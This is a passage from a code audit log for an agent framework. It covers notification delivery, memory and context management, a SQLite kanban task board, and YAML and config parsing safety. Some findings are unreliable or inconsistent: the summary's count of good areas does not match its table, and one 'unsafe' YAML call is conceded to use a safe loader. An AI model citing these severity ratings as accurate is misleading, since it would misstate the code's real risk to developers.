**Kanban task escalation:** The kanban system has a circuit breaker pattern in `hermes_cli/kanban_db.py` — a `consecutive_failures` counter with a configurable trip threshold (`failure_limit` per task). Tasks that reach the failure limit transition to `gave_up` state and subscribers are notified via the `_kanban_notifier_watcher`. There is no multi-tier escalation (e.g., warning → critical → supervisor); a task either succeeds, gets blocked/spawn_auto_blocked, or gives up after reaching the limit.

**Stuck-loop escalation:** The gateway session manager (`gateway/session.py`) has a `restart_failure_counts` counter that handles terminal escalation for genuinely stuck sessions. Sessions suspended via `/stop` or stuck-loop escalation are excluded from message processing. This is a system-level safety mechanism, not a user-facing alerting escalation.

### Operator Notification Channels

**Signal:** `gateway/platforms/signal.py` — full adapter with SSE inbound, JSON-RPC outbound, attachment support, rate limiting via `signal_rate_limit.py`. The rate limiter is a process-wide token-bucket with `SIGNAL_RATE_LIMIT_BUCKET_CAPACITY = 50`, `SIGNAL_RATE_LIMIT_DEFAULT_RETRY_AFTER = 4s`. It handles 429 detection across three error shapes (typed error code, legacy `[429]` substring, `RetryLaterException` wrapped in `AttachmentInvalidException`). There is no Signal-specific retry loop in the adapter — rate limit errors propagate to the caller.

**Email:** `gateway/platforms/email.py` — IMAP for receiving, SMTP for sending. Has `_NOREPLY_PATTERNS` blocklist and `_AUTOMATED_HEADERS` RFC checks (`Auto-Submitted`, `Precedence`, `X-Auto-Response-Suppress`, `List-Unsubscribe`) to filter automated mail. The adapter sends messages via SMTP with TLS. No retry loop, no delivery receipts, no fallback channel.

**Webhook:** `gateway/platforms/msgraph_webhook.py` and gateway hooks (`~/.hermes/hooks/HOOK.yaml`) support alert routing to external systems. There is no per-webhook retry configuration visible in the adapter base or config.

**Fallback channel configuration:** No operator-configurable fallback channels exist. The `notify_exclude_platforms` in `SessionResetPolicy` only suppresses notifications to certain platforms, it does not redirect to an alternative channel.

**Rate limits per channel:**
- Signal: token-bucket (50 capacity, 1 token per 4s default refill)
- Cron scheduler: live adapter timeout 60s, standalone timeout 30s
- No global notification rate limiter across all channels

### Sensitive Data in Notifications

**Credential redaction:** The `security.redact_secrets` config controls redaction of tool output, logs, chat responses, session JSONs. The `hermes debug share` command (`hermes_cli/debug.py`) applies `_redact_log_text()` at upload time when `security.redact_secrets` is enabled. Phone numbers are redacted via `redact_phone()` in `gateway/platforms/helpers.py`. The `gateway/run.py` logs a notice when secret redaction is enabled.

**Session redaction:** Session history (`session.history` tool) is returned raw without scrubbing according to Pass #60 findings. This means if a session contains credentials, they would be exposed through the history API.

**Path redaction:** File paths appear in notification text (e.g., kanban task completion messages include task IDs and titles), but there is no systematic path redaction in notification content. The `safe_url_for_log()` in `base.py` strips query/fragment/userinfo from URLs before logging.

**Send message errors:** `RELEASE_v0.8.0.md` (#5650, @WAXLYY) notes "Redact query secrets in send_message errors" — error messages in the send_message path previously leaked query string secrets.

### Notification Fatigue

**Rate limiting:** No global notification throttle exists across all platforms. The Signal rate limiter is per-attachment (not per-message), so a large batch of attachments would be paced. The `TextBatchAggregator` in `gateway/platforms/helpers.py` aggregates rapid-fire text events into single messages (batch_delay=0.6s, split_delay=2.0s) — this reduces notification spam at the platform adapter level but is not operator-configurable per alert type.

**Quiet hours:** `[SILENT]` in the agent's final response suppresses delivery in cron jobs. There is no operator-configurable quiet hours window (e.g., "do not notify between 22:00–07:00"). The `SessionResetPolicy.notify` flag controls whether to send a reset notification, but does not support time-based suppression.

**Alert grouping:** The `TextBatchAggregator` groups rapid text events per session into single messages — not configurable and applies only to inbound message batching, not outbound notifications. Kanban notifications are sent one-per-event with a cursor-based claim mechanism that atomically advances the cursor to prevent duplicate delivery.

**Alert deduplication:** `MessageDeduplicator` (in `gateway/platforms/helpers.py`) is a centralized TTL-based deduplication cache (default 2000 entries, 300s TTL) used by: slack, wecom, weixin, qqbot, mattermost, dingtalk, yuanbao. Each adapter has its own instance. TTL pruning keeps entries within the window, and max_size is enforced by keeping newest entries when TTL pruning alone doesn't reduce the set. Feishu's dedup cache uses a 24-hour TTL (P46-8) — delayed duplicates possible on extended retries, flagged LOW.

**Notification suppression:** `SessionResetPolicy.notify` can disable reset notifications. `[SILENT]` suppresses cron delivery. `_session_expiry_watcher` handles auto-reset notifications only when `notify` is True and platform is not in `notify_exclude_platforms`.

### Gaps and Risks

1. **No operator-facing alert escalation policy** — no tiered escalation rules, no escalation to a secondary operator after N minutes of silence, no escalation to email/webhook when all messaging channels fail.
2. **No delivery receipt verification** — `SendResult` confirms platform accept, not user receipt.
3. **No cross-channel fallback** — if Telegram fails, no automatic redirect to Signal, email, or webhook. Notifications lost after 3 failures (kanban) or logged and abandoned (cron).
4. **No retry loop for user-facing notifications** — only Signal has autonomous retry (1 retry on rate limit). Email and webhook failures propagate with no autonomous retry.
5. **Sensitive data in notifications** — `session.history` returns raw history without redaction. Credentials in session context could appear in error notifications or reset alerts.
6. **No quiet hours** — no time-based notification suppression.
7. **No notification fatigue controls** — no per-alert-type rate limiting, no max-notifications-per-hour cap, no operator-configurable grouping rules.

---

### Summary

| Area | Status | Severity |
|------|--------|----------|
| Signal rate limiting | Token-bucket with server feedback, 1 retry | GOOD |
| MessageDeduplicator | Centralized TTL-based dedup cache, 300s default | GOOD |
| Kanban notifier dedup | Atomic claim + rewind on failure | GOOD |
| Session reset notifications | Configurable per-platform exclusion | GOOD |
| Email automated-sender filtering | RFC header checks + noreply patterns | GOOD |
| Secret redaction in logs | `security.redact_secrets` + `_redact_log_text` | GOOD |
| Phone redaction | `redact_phone()` in helpers, used by SMS/Signal | GOOD |
| Cron two-tier delivery | Live adapter → standalone fallback | GOOD |
| No cross-channel fallback | Failed platform → no redirect to alternative | MEDIUM |
| No delivery receipt tracking | SendResult confirms platform accept, not user receipt | MEDIUM |
| No operator alert escalation | No tiered escalation, no secondary operator routing | MEDIUM |
| No retry for non-Signal notifications | Email/webhook failures propagate, no autonomous retry | MEDIUM |
| session.history no redaction | Raw history returned without credential scrubbing | LOW |
| No quiet hours | No time-based notification suppression | LOW |
| No notification fatigue controls | No per-type rate limiting, no max-per-hour cap | LOW |
| Feishu dedup 24h TTL | Delayed duplicates possible on extended retries | LOW |

**6 GOOD areas, 4 MEDIUM gaps, 4 LOW issues. No CRITICAL.**


## Pass #62 – Memory Provider, Curation & Context Management Deep Dive – 2026-05-24

---

### 1. Memory Provider Implementation

**Core abstraction**: agent/memory_provider.py — MemoryProvider ABC.

Required interface:
- name (property), is_available(), initialize(session_id, **kwargs)
- system_prompt_block() — static provider info for system prompt
- prefetch(query, session_id) — synchronous recall, returns context text
- queue_prefetch(query, session_id) — async background prefetch for next turn
- sync_turn(user_content, assistant_content, session_id) — async write after each turn
- get_tool_schemas(), handle_tool_call(), shutdown()

Optional hooks: on_turn_start(), on_session_end(), on_session_switch(), on_pre_compress(), on_memory_write(), on_delegation().

**MemoryManager** (agent/memory_manager.py) is the single orchestrator for all providers:
- Maintains ordered _providers list (builtin first, one external allowed)
- Rejects a second external provider with a warning (prevents tool-schema bloat/conflicting backends)
- build_system_prompt() — concatenates all system_prompt_block() results
- prefetch_all() — calls prefetch() on all providers, joins results with double-newlines
- queue_prefetch_all() — fires background prefetch on all providers
- sync_all() — fires sync_turn() on all providers after each turn
- on_turn_start(), on_session_switch(), on_pre_compress(), on_memory_write() — fan out to all providers

**Plugin providers** live in plugins/memory/<name>/:
- mem0 — server-side extraction, semantic search with reranking, user_id/agent_id scoping. Circuit breaker: 5 consecutive failures -> 120s cooldown.
- honcho — dialectic Q&A, peer cards, conclusions. Complex B1/B5 cost-awareness: recall_mode (context/tools/hybrid), injection_frequency (every-turn/first-turn), context_cadence, dialectic_cadence, dialectic_depth (1-3 passes). Stale thread/result detection. Truncates to context_tokens budget.
- hindsight, openviking, byterover, supermemory, retaindb, holographic — all implement MemoryProvider

**Built-in memory**: separate from external providers. agent._memory_store with MEMORY.md and USER.md files, loaded into system prompt via format_for_system_prompt() in volatile tier.

**No priority/importance ranking in MemoryProvider ABC or MemoryManager.** All providers return their full prefetch result; ranking is delegated to the external backend (mem0 reranking, Honcho semantic search).

**No stale-data handling in MemoryProvider base.** Honcho has explicit stale-thread detection (age > timeout x 2.0 multiplier -> dead) and stale-result discarding (pending result older than dialectic_cadence x 2 turns -> discarded).

---

### 2. Context Window Management

**Size determination**: agent/context_compressor.py — ContextCompressor:
- context_length set from model metadata (get_model_context_length())
- threshold_tokens = max(int(context_length x threshold_percent), MINIMUM_CONTEXT_LENGTH) where threshold_percent = 0.75
- summary_target_ratio = 0.20 -> summary budget = threshold_tokens x 0.20
- Minimum summary tokens: 2000, ceiling: 12000

**Overflow detection**: should_compress(prompt_tokens) — true when prompt_tokens >= threshold_tokens. Anti-thrashing: if last 2 compressions saved <10% each, skip compression to avoid infinite loops.

**Trimming/summarization strategy** (in compress()):
1. _strip_historical_media() — replace image parts in messages before the newest image-bearing user message with placeholders
2. _prune_old_tool_results() — replace old tool results with 1-line summaries (deduplicates identical reads, truncates large tool_call args)
3. Protect head (first 3 non-system messages by default) and tail (last 6 messages by default)
4. Middle section sent to auxiliary LLM for summarization with structured template (SUMMARY_PREFIX preamble + message history)
5. Summary + tail appended after last protected head message

**Built-in memory not compressed** — on_pre_compress() hook lets providers extract insights before compression discards messages.

---

### 3. Memory Eviction Policy

**No global LRU or time-based expiration in MemoryManager or MemoryProvider ABC.** Eviction is entirely delegated to external provider backends:
- mem0: managed by Mem0 Platform API (server-side)
- Honcho: managed by Honcho backend
- Built-in MEMORY.md/USER.md: no eviction, files persist until user edits

**Stale data handling** (Honcho-specific):
- _STALE_THREAD_MULTIPLIER = 2.0 — threads older than timeout x 2.0 treated as dead
- _STALE_RESULT_MULTIPLIER = 2 — pending results older than dialectic_cadence x 2 turns discarded
- _BACKOFF_MAX = 8 — cap on empty-streak backoff for cadence widening

**Context compression** is the closest thing to eviction: middle messages summarized and replaced with a summary. protect_first_n=3, protect_last_n=6 by default. Anti-thrashing prevents infinite compression loops.

**No importance-based retention** in the core compressor. All middle messages are treated equally for summarization.

---

### 4. Context Injection Order

**System prompt assembly** (agent/system_prompt.py):
1. stable tier first — SOUL.md/DEFAULT_AGENT_IDENTITY, tool guidance, Nous subscription, computer-use guidance, tool-use enforcement, skills prompt, environment hints, platform hints, model operational guidance
2. context tier — caller-supplied system_message + context files (AGENTS.md, .cursorrules, etc.) under TERMINAL_CWD
3. volatile tier — memory store block (MEMORY.md), USER.md block, external memory provider block (_memory_manager.build_system_prompt()), timestamp/session/model/provider line

**Memory context injection** (agent/conversation_loop.py, lines ~610-628, ~799-808):
- Prefetch happens ONCE before the tool loop (_ext_prefetch_cache = agent._memory_manager.prefetch_all(_query))
- Cached result reused on every iteration (no re-call on each tool call)
- Current turn user message: injected as <memory-context>...[/memory-context] block, appended after user's text content
- Wrapped via build_memory_context_block() which adds fence tags + system note: [System note: The following is recalled memory context, NOT new user input. Treat as authoritative reference data]
- StreamingContextScrubber handles chunk-boundary split fence tags
- sanitize_context() strips fence tags and internal context blocks from streaming output

**Injection order in API call**:
1. System prompt (stable cached string)
2. Optional ephemeral_system_prompt (API-call-time only, not persisted)
3. Optional prefill messages
4. Conversation history (user message with injected memory context at current turn index)
5. Anthropic prompt caching markers if enabled

**No priority boosting** — all provider prefetch results concatenated equally. Honcho orders: Session Summary -> User Representation -> User Peer Card -> AI Self-Representation -> AI Identity Card.

---

### 5. Multi-Session Memory Isolation

**Session scoping via session_id** passed to all provider methods:
- initialize(session_id, **kwargs), prefetch(), queue_prefetch(), sync_turn(), on_session_switch() — all carry session_id
- on_session_switch(new_session_id, parent_session_id, reset) — hook for mid-process session rotation

**Honcho session resolution**:
- session_key = cfg.resolve_session_name(session_title, session_id, gateway_session_key) or session_id or hermes-default
- Per-session strategy creates a fresh session per run; memory file migration skipped for per-session strategy
- Lazy init support for tools-only mode (_ensure_session())

**MemoryManager enforcement**:
- Only ONE external provider at a time
- Tool name conflict detection — duplicates logged and ignored
- on_session_switch() fan-out ensures all providers update per-session state

**Potential cross-session issues**:
- Honcho session_strategy config: per-session vs workspace-level. Default not confirmed in code.
- mem0 user_id scoping: if multiple gateway sessions share same user_id, memories are mixed
- Built-in MEMORY.md/USER.md are file-based, not session-scoped — same files across all sessions unless profile-scoped via HERMES_HOME
- skip_memory on subagents prevents memory observation, but parent on_delegation() hook notifies providers of subagent completion with child_session_id

---

### Key Files

- agent/memory_provider.py — MemoryProvider ABC (279 lines)
- agent/memory_manager.py — MemoryManager orchestration (609 lines)
- agent/conversation_loop.py — prefetch injection at lines ~610-628 and ~799-808
- agent/context_compressor.py — ContextCompressor compression engine (1749 lines)
- agent/system_prompt.py — system prompt tier assembly (380 lines)
- agent/context_engine.py — ContextEngine ABC (212 lines)
- plugins/memory/mem0/__init__.py — Mem0 provider (373 lines)
- plugins/memory/honcho/__init__.py — Honcho provider (1328 lines)

## Pass #63 – Kanban, Project Management & Task Tracking Deep Dive – 2026-05-24T20:25:00Z

Scope: hermes_cli/kanban_db.py, hermes_cli/kanban.py, plugins/kanban/dashboard/plugin_api.py, tools/kanban_tools.py

### KANBAN DATABASE SCHEMA

**File:** `hermes_cli/kanban_db.py` (lines 810–947 SCHEMA_SQL)

### K63-1 · task_links has no FK constraints — orphan links silently possible — LOW

**File:** `hermes_cli/kanban_db.py` (SCHEMA_SQL, lines 870–874)
```
CREATE TABLE IF NOT EXISTS task_links (
    parent_id  TEXT NOT NULL,
    child_id   TEXT NOT NULL,
    PRIMARY KEY (parent_id, child_id)
);
```
No `REFERENCES tasks(id)` foreign key. Manual `DELETE FROM task_links` is done in `delete_task` and `delete_archived_task` (lines 3766–3768, 3791), which is correct. However, the absence of FK constraints means a bug in any future code path that inserts into `task_links` without validation would silently produce dangling links, and `ON DELETE CASCADE` is not available as a safety net.

### K63-2 · task_runs.current_run_id denormalised but kept consistent — OK

The `tasks.current_run_id` pointer is denormalised (a copy of the live run id), but every state transition function (`claim_task`, `_end_run`, `block_task`, `complete_task`, `archive_task`, `reclaim_task`, `release_stale_claims`) updates both `tasks.current_run_id` and `task_runs` rows together inside the same write_txn. The CAS pattern in `_end_run` (line 2098–2122) only closes a run if `ended_at IS NULL`, preventing double-close. The invariant `current_run_id IS NULL ⇔ run in terminal state` is maintained.

### K63-3 · Backward-compatible migrations use IF NOT EXISTS — safe — OK

`_add_column_if_missing` (line 1232) catches `duplicate column name` and `_guard_existing_db_is_healthy` runs `PRAGMA integrity_check` on existing DBs before schema init, backing up corrupt files. The `_backup_corrupt_db` function (line 1029) confines writes to the original DB's parent directory using resolved paths.

### K63-4 · WAL mode + BEGIN IMMEDIATE for all writes — correct concurrency strategy — OK

`write_txn` (line 1469) always opens `BEGIN IMMEDIATE`. `connect` (line 1135) activates WAL. Comment at line 61–68 explicitly explains why: SQLite serialises writers via WAL lock, so at most one claimer wins any given task. Losers observe `rowcount == 0` and move on without retry loops. Per-board isolation is intentional.

### K63-5 · Idempotency check in create_task outside write_txn — race can produce duplicate rows — LOW

`create_task` (line 1636–1649) checks the idempotency key outside the write txn (for performance). Two concurrent requests with the same key can both pass the check, then both insert. The subsequent lookup stabilises, but two rows briefly exist. Not exploitable for data loss; `idempotency_key` is a dedup hint, not a unique constraint. No action item — design acknowledged in comment.

### K63-6 · _find_missing_parents uses f-string in SQL parameter list — safe — OK

Line 1759:
```python
placeholders = ",".join("?" * len(parents))
rows = conn.execute(
    f"SELECT id FROM tasks WHERE id IN ({placeholders})",
    parents,
).fetchall()
```
`placeholders` is built from `len(parents)`, not from any external input. `parents` comes from the caller. Parameterized correctly. Not a SQL injection vector.

### TASK STATE MACHINE

**Files:** `kanban_db.py` (claim_task 2289, complete_task 2854, block_task 3251, promote_task 3307, unblock_task 3377, archive_task 3725, schedule_task 3878)

### K63-7 · Blocked task "sticky" semantics — correctly prevents auto-recovery of worker-initiated blocks — OK

`_has_sticky_block` (line 2191) checks whether the most recent `blocked`/`unblocked` event is `blocked` (worker/operator-initiated). `recompute_ready` (line 2229) skips promotion for sticky-blocked tasks. This correctly implements the pattern from issue #28712: `kanban_block` (human review handoff) should NOT auto-resolve when parents complete, while circuit-breaker blocks (`gave_up` event) should.

### K63-8 · claim_task enforces parent-completion invariant inside the same txn — OK

Lines 2313–2329: inside `write_txn`, if any parent is not `done`/`archived`, the task is demoted from `ready` to `todo` and a `claim_rejected` event is emitted. This prevents a race where `recompute_ready` promoted a task but the parent hasn't committed yet. This is the single enforcement point regardless of which writer set `status='ready'`.

### K63-9 · release_stale_claims discriminates host-local workers vs. remote — OK

`release_stale_claims` (line 2509) checks `host_local = lock.startswith(host_prefix)` and `worker_pid` liveness via `_pid_alive`. If a stale claim's worker is still alive on the same host, it extends the TTL instead of reclaiming, preventing the spawn-then-immediately-reclaim loop (issue #23025).

### K63-10 · No explicit state machine validation — invalid transitions possible via direct SQL — BY_DESIGN

There is no `VALID_TRANSITIONS` matrix enforced in the DB layer. `block_task` accepts `running`/`ready`; `complete_task` accepts `running`/`ready`/`blocked`; `schedule_task` accepts `todo`/`ready`/`running`/`blocked`. An operator who writes `UPDATE tasks SET status = 'done' WHERE id = 't_xxx'` bypasses all logic but also bypasses all safety (no run closure, no event emission). This is documented BY_DESIGN — the CLI/gateway layers go through the API.

### TASK ASSIGNMENT

**File:** `kanban_db.py` (assign_task 1839, reassign_task 2691, _canonical_assignee 1518)

### K63-11 · assignee field has no FK constraint to profiles — tasks can be assigned to non-existent profiles — BY_DESIGN

`_canonical_assignee` (line 1518) normalizes via `normalize_profile_name`, but `assign_task` (line 1839) writes the result to `tasks.assignee` with no existence check. Any string can be stored as assignee. The dispatcher (`dispatch_once`) calls `profile_exists(row["assignee"])` (line 4963) and skips tasks whose assignee is not a real Hermes profile. This is the gating point — the field itself is unconstrained. BY_DESIGN documented in dispatcher code.

### K63-12 · assign_task refuses to reassign a running task — correct — OK

Line 1852: `if row["claim_lock"] is not None and row["status"] == "running": raise RuntimeError(...)`. The `reassign_task` wrapper (line 2691) accepts `reclaim_first=True` to handle this case. This prevents an operator from silently stealing a running task.

### K63-13 · Reassigning resets consecutive_failures — correct recovery semantics — OK

Line 1862: `UPDATE tasks SET assignee = ?, consecutive_failures = 0, last_failure_error = NULL`. When a human explicitly reassigns (recovery action), the new profile should not inherit the previous profile's failure streak. Explicitly documented.

### K63-14 · No isolation between boards in assign operations — OK

Each board has its own `kanban.db`. `kanban_db.connect()` resolves the DB from `HERMES_KANBAN_DB` → `HERMES_KANBAN_BOARD` → `current` file → `default`. Workers see only their board's DB. The dispatcher injects env vars into worker subprocesses to pin them to the correct DB. No cross-board mutation is possible through the API.

### KANBAN API ENDPOINTS

**File:** `plugins/kanban/dashboard/plugin_api.py`

### K63-15 · Dashboard plugin API routes use session-token auth — OK

Lines 64–83: `_check_ws_token` uses `hmac.compare_digest` for constant-time comparison against `_SESSION_TOKEN`. HTTP routes (not WebSocket) live behind the dashboard's plugin-bypass auth middleware. WebSocket routes require `?token=` query param. Documented at lines 14–33.

### K63-16 · Board slug validated before DB access — OK

`_resolve_board` (line 86) calls `kanban_db._normalize_board_slug` and raises `HTTPException(400)` on invalid slugs. Returns `None` when omitted (falls through to active board). Board existence checked for non-default boards, raising `HTTPException(404)`. Prevents enumeration attacks.

### K63-17 · No SQL injection in plugin_api.py handlers — OK

Plugin API uses `kanban_db.connect()` and calls kanban_db functions directly. No raw SQL string construction with external input. Board slug validated through `_normalize_board_slug` before DB access.

### K63-18 · Dashboard plugin uses kanban_db functions directly — no drift between CLI/API/dashboard — OK

Every handler wraps `kanban_db.connect()` → calls kanban_db functions → returns serialized output. Same code paths as CLI and gateway. Explicitly documented at lines 6–8.

### K63-19 · No explicit rate limiting on kanban API endpoints — LOW

The plugin API (FastAPI router) has no per-route rate limiting. The kanban board is a single-user/local tool on a local HTTP socket. Rate limiting exists in the gateway's platform adapters (pairing.py, stream_consumer.py), not in the kanban plugin layer. Not a significant risk for local-only tooling.

### PROJECT/TAG ORGANIZATION

**Files:** `hermes_cli/kanban_db.py` (boards management 476–595), `hermes_cli/kanban.py` (boards subcommand)

### K63-20 · Board slug validator prevents path traversal — OK

`_BOARD_SLUG_RE` (line 160): `^[a-z0-9][a-z0-9\-_]{0,63}$` — lowercase alphanumerics, hyphens, underscores only. No `..`, no `/`, no absolute-looking values. `board_dir` (line 286) uses `boards_root() / slug` and `kanban_db_path` uses the validated slug. Prevents board-name-based path traversal.

### K63-21 · delete_archived_task requires status='archived' before hard delete — safety guard — OK

`delete_archived_task` (line 3751): `SELECT status FROM tasks WHERE id = ?` → checks `status != 'archived'` → returns False. Active/blocked/done tasks must be explicitly archived first. `delete_task` (line 3777) does NOT have this guard — it hard-deletes any status — but it is a separate function not exposed through the CLI.

### K63-22 · remove_board (archive) discards _INITIALIZED_PATHS cache entry before rename — correct — OK

Line 578: `_INITIALIZED_PATHS.discard(str((d / "kanban.db").resolve()))`. A concurrent `connect(board=normed)` after the rename would recreate an empty sqlite file via `mkdir(exist_ok=True)`. Dropping the cache entry ensures the schema init pass re-runs on that fresh file. Race acknowledged in comment at line 575.

### K63-23 · Archived boards move to `_archived/<slug>-<timestamp>/` with collision guard — OK

`remove_board` (line 580–590): `archive_root / f"{normed}-{ts}"` with incrementing suffix on collision. Prevents rapid double-archive collisions. `default` board cannot be removed (line 565).

### K63-24 · No orphan tag system — kanban has no tags, only task attributes — N/A

The kanban schema (`tasks`, `task_links`, `task_comments`, `task_events`, `task_runs`, `kanban_notify_subs`) has no `tags` table. The word "tag" in the kanban context refers to git branches and `idempotency_key` labels, not a separate tagging system. No orphan tag cleanup needed.

### K63-25 · Cascade delete handled explicitly in delete_task / delete_archived_task — OK

Lines 3765–3773 and 3788–3795: manual `DELETE FROM task_links / task_comments / task_events / task_runs / kanban_notify_subs` in the correct order before deleting the task row. The schema does not use `ON DELETE CASCADE` foreign keys (explicit by design per comment at line 3780). All deletes are wrapped in `write_txn` for atomicity.

### SUMMARY

The kanban implementation is well-engineered for a single-node, local-first multi-profile task board. Key strengths:

- WAL mode + `BEGIN IMMEDIATE` is the correct SQLite concurrency strategy for the use case
- Parent-completion invariant is enforced atomically at claim time, not just at promotion time
- Sticky-block semantics correctly distinguish worker-initiated blocks from circuit-breaker blocks
- Claim locking (TTL-based) prevents duplicate worker spawns without distributed lock machinery
- Board slug validation prevents traversal attacks
- Dashboard API auth uses `hmac.compare_digest` for token comparison
- Safe migration strategy with corrupt-DB backup before recreation
- Cascading deletes handled explicitly in dedicated delete paths

Areas of note (all BY_DESIGN or LOW severity):

- `assignee` field accepts any string; dispatcher is the actual gate via `profile_exists()`
- No formal state transition matrix; direct SQL bypasses all logic
- Idempotency check is a hint, not a unique constraint (race acknowledged)
- `task_links` has no FK constraint (manual cleanup in all delete paths)
- No rate limiting on kanban API (local tool, single-user assumption)

### Key Files Audited

- `hermes_cli/kanban_db.py` — Core SQLite schema, state machine, claim/complete/block/archive, boards management, dispatch helpers (6579 lines)
- `hermes_cli/kanban.py` — CLI argparse surface for kanban subcommands (2762 lines)
- `plugins/kanban/dashboard/plugin_api.py` — Dashboard HTTP/WebSocket API (2217 lines)
- `tools/kanban_tools.py` — Worker-side kanban tools (MCP interface)
---

## Pass #65 – YAML, Config Parsing & Deserialization Security Deep Dive – 2026-05-24T21:45:00Z

**Scope:** yaml.safe_load enforcement, config file injection, config validation, skill YAML frontmatter parsing, environment variable injection, pickle deserialization, subprocess shell usage.

---

### 1. YAML Safe_load Enforcement

**Finding: Mostly GOOD — 50 yaml.safe_load calls across the codebase, but 3 unsafe yaml.load instances found.**

The overwhelming majority of YAML loading correctly uses `yaml.safe_load()` or `yaml.SafeLoader`/`yaml.CSafeLoader`. However, three files use unsafe `yaml.load()` without `Loader=SafeLoader`:

#### 🔴 CRITICAL: `hermes_cli/xai_retirement.py` line 207
```python
yaml = YAML(typ="rt")   # ruamel.yaml round-trip mode
with config_path.open("r", encoding="utf-8") as fh:
    doc = yaml.load(fh)  # DANGER: yaml.load without safe loader
```
- **File:** `hermes_cli/xai_retirement.py` (lines 204-207)
- **Issue:** Uses `ruamel.yaml.YAML(typ="rt")` — the `typ="rt"` (round-trip) mode resolves YAML anchors/aliases, which can lead to resource exhaustion (billion laughs attack) and arbitrary object construction if the config file is crafted maliciously. While `ruamel.yaml` doesn't use the unsafe `!!python/object` tags by default, round-trip mode is still riskier than `SafeLoader`.
- **Context:** Used by `hermes doctor` to scan for retired xAI models. An attacker who could write to `~/.hermes/config.yaml` could potentially craft a malicious YAML that, when processed by `ruamel.yaml` round-trip, could cause memory exhaustion or unexpected behavior.

#### 🟡 MEDIUM: `agent/skill_utils.py` line 79
```python
return yaml.load(value, Loader=loader)  # loader is CSafeLoader or SafeLoader
```
- **File:** `agent/skill_utils.py` line 79
- **Issue:** Uses `yaml.load()` (not `yaml.safe_load()`) with an explicit `Loader` parameter. The loader IS `CSafeLoader` or `SafeLoader` (safe), but the call pattern is non-standard and the function comment claims it uses "CSafeLoader for full YAML support" — this could mislead future maintainers into removing the Loader argument or switching to `!!python/object`.
- **Mitigating factor:** The loader is explicitly set to CSafeLoader/SafeLoader, so it is technically safe.

#### 🟡 MEDIUM: `tests/hermes_cli/test_migrate_xai.py` line 64
```python
yaml = YAML(typ="rt")
with path.open("r", encoding="utf-8") as fh:
    return yaml.load(fh)  # Test helper using ruamel.yaml round-trip
```
- **File:** `tests/hermes_cli/test_migrate_xai.py` line 64
- **Issue:** Test-only code, but uses the same `ruamel.yaml YAML(typ="rt")` round-trip pattern.
- **Mitigating factor:** Test files are not production code paths, but this trains developers to use the pattern.

**Overall assessment:** 50 uses of `yaml.safe_load()` + `CSafeLoader/SafeLoader` throughout production code is good. The 3 unsafe uses are concerning but have mitigations. However, `ruamel.yaml` round-trip mode (`typ="rt"`) in production code (`hermes_cli/xai_retirement.py`) is the primary security concern.

---

### 2. Config File Injection

**Finding: LOW RISK — No YAML anchor/alias exploitation or entity expansion found.**

Searched for: `!include`, `!import`, `!!python`, `UnsafeLoader`, and patterns related to entity expansion.

- **YAML anchors/aliases:** Not used in any config file. Searched all YAML-related files — no custom tags or anchor references found.
- **Entity expansion (Billion Laughs):** No evidence of recursive YAML anchors. The `ruamel.yaml` round-trip mode could theoretically be vulnerable if a crafted config with deeply nested anchors were loaded, but the actual usage in `xai_retirement.py` processes config keys as simple strings and doesn't recursively deserialize arbitrary nested structures.
- **Object deserialization:** No `!!python/object` or `!!python/unicode` tags found in any YAML file. The codebase does NOT use pickle for config (only for skill snapshots — see section 4).

**Config validation:** The `hermes_cli/config.py` `_normalize_root_model_keys()` and `_normalize_max_turns_config()` functions do perform normalization and type coercion. The `_coerce_bool`, `_coerce_float`, `_coerce_int` in `gateway/config.py` handle type safety. No major validation gaps found — but the `_expand_env_vars()` function does expand `${VAR}` references in config values, which could allow environment variable injection (see section 5).

---

### 3. Config Validation — Type Coercion & Default Value Vulnerabilities

**Finding: MODERATE — Type coercion functions exist but have edge cases.**

Key validation functions in `gateway/config.py`:
```python
def _coerce_bool(value: Any, default: bool = True) -> bool:
    if isinstance(value, str):
        lowered = value.strip().lower()
        if lowered in {"true", "1", "yes", "on"}:
            return True
        if lowered in {"false", "0", "no", "off"}:
            return False
        return default  # Falls through on unrecognized strings
```

- **Good:** Returns default on unrecognized strings (safe fallback)
- **Good:** Coercion functions use try/except with safe defaults
- **Issue:** YAML 1.1 parses bare `off` as boolean `False` — there's an explicit comment about this at `gateway/config.py` line 994: `# YAML 1.1 parses bare 'off' as boolean False — coerce to string "off".` — The code handles this correctly.
- **Issue:** The `_normalize_root_model_keys()` in `hermes_cli/config.py` silently converts string model configs to dicts — this is intentional migration behavior but could hide type errors.

**Default value handling:** Default config in `hermes_cli/config.py` is well-structured (`DEFAULT_CONFIG` dict). If config loading fails, it falls back to defaults via `_warn_config_parse_failure()` which logs and warns on stderr. This is correct behavior.

---

### 4. Skill YAML Frontmatter — Safe Parsing

**Finding: GOOD with ONE CONCERN — Safe YAML loading with fallback, but ruamel.yaml round-trip used elsewhere.**

The skill frontmatter parsing in `agent/skill_utils.py` is well-designed:
```python
# Line 71-82: Uses CSafeLoader with fallback to SafeLoader
loader = getattr(yaml, "CSafeLoader", None) or yaml.SafeLoader
def _load(value: str):
    return yaml.load(value, Loader=loader)  # Explicit safe loader
```

Frontmatter parsing (`parse_frontmatter()` at line 88):
1. Extracts `---\n...\n---\n` block using regex
2. Uses `yaml_load()` (safe) to parse the YAML content
3. Has a fallback to simple `key: value` splitting on parse failure
4. Type-checks `isinstance(parsed, dict)` before using result

**Skill path validation:** `get_external_skills_dirs()` in `agent/skill_utils.py` (lines 241-324):
- Expands `~` and `${VAR}` env vars in paths
- Resolves relative paths against HERMES_HOME, not cwd
- Excludes paths that resolve to local `~/.hermes/skills/`
- Returns only existing directories

**Security concern — SKILL.md files could contain malicious frontmatter:**
- A skill with malicious YAML frontmatter could try to exploit the fallback parsing
- The `skill_matches_platform()` and `extract_skill_conditions()` functions handle non-dict metadata gracefully (lines 148-156, 341-355)
- No execution of frontmatter values as code

**Skill metadata is NOT validated against a schema** — values are used directly. However, since frontmatter is only used for conditional routing and display, not for code execution, this is low risk.

---

### 5. Environment Variable Injection

**Finding: MODERATE — `_expand_env_vars()` in config loading allows env var interpolation, but no `eval()`/`exec()` on config values found.**

#### ✅ SAFE: No eval()/exec() on environment variables
Searched for `eval(` and `exec(` across the codebase:
- Found NO instances of `eval(os.getenv(...))` or `exec(os.getenv(...))`
- Found no dynamic code execution from config/env vars
- The `eval`/`exec` references found are in: test helper functions, subprocess calls with explicit command lists (NOT shell=True), and browser evaluation functions — all safe

#### ⚠️ KNOWN BEHAVIOR: `${VAR}` expansion in config values
**File:** `hermes_cli/config.py` lines 4160-4177
```python
def _expand_env_vars(obj):
